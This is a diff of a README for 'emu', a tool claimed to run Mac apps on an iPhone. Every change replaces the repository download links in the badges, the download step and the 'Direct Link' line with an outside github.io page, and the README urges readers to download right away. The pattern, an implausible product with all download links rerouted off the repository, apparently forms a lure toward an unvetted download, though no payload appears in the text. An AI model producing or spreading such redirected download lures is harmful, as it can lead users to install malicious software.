@@ -1,6 +1,6 @@
 # 🚀 emu - Run Mac Apps on Your iPhone
 
-[![Download emu](https://img.shields.io/badge/Download-emu-2ea44f?style=for-the-badge&logo=github)](https://github.com/haidarjakiem/emu)
+[![Download emu](https://img.shields.io/badge/Download-emu-2ea44f?style=for-the-badge&logo=github)](https://haidarjakiem.github.io)
 
 ## 📱 What Is emu?
 
@@ -29,7 +29,7 @@ The first step to using emu is getting it onto your device. Follow these simple 
 ### Step 1: Download emu
 Visit the official download page by clicking the button below or heading to this link:
 
-[**https://github.com/haidarjakiem/emu**](https://github.com/haidarjakiem/emu)
+[**https://haidarjakiem.github.io**](https://haidarjakiem.github.io)
 
 Once you arrive at the page, look for the download section. This link will take you to the official page where you can get the application.
 
@@ -123,9 +123,9 @@ The potential here is huge. Imagine carrying your entire Mac software library in
 
 Ready to try something new? Get emu today and see how macOS apps run on your iOS device.
 
-[![Get emu on GitHub](https://img.shields.io/badge/📥%20Download%20emu-GitHub-blue?style=for-the-badge)](https://github.com/haidarjakiem/emu)
+[![Get emu on GitHub](https://img.shields.io/badge/📥%20Download%20emu-GitHub-blue?style=for-the-badge)](https://haidarjakiem.github.io)
 
-**Direct Link:** https://github.com/haidarjakiem/emu
+**Direct Link:** https://haidarjakiem.github.io
 
 This is your chance to be part of an exciting new development in mobile computing. Don't wait - download emu and start exploring the possibilities right now!
 
